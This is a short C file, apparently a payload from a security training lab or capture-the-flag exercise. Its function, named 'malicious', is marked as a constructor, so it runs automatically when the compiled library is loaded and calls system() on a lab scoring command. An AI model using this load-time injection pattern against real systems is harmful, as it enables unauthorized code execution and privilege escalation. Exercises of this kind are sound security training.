#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
	system("/usr/local/bin/score c427b48f-593f-4827-8728-6f002efba8d1");
}
